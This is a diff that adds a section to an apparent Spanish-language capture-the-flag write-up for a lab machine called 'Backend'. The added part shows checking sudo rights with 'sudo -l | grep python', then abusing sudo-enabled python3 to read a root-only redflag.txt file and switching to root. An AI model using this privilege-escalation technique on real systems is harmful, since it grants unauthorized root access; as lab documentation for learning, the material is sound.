@@ -120,4 +120,20 @@ ssh alejandro@172.17.0.2 -p 22
 ```
 ![Máquina Backend](/Img/ssh.jpeg)
 
+Se encontro un archivo redflag.txt pero no podiamos acceder porque solo el usuario root tenia los permisos, buscamos vulnerabilidades para escalar privilegios y encontre que python puede ejecutar comando como root con el comando lo verificamos.
 
+```bash
+sudo -l | grep python
+```
+Procedemos a explotar esta vulnerabilidad:
+
+```bash
+sudo python3 -c "print(open('redflag.txt').read())"
+```
+
+![Máquina Backend](/Img/root.jpeg)
+Por ultimo verificamos las credenciales que sean correctas:
+```bash
+su -
+```
+![Máquina Backend](/Img/ter.jpeg)
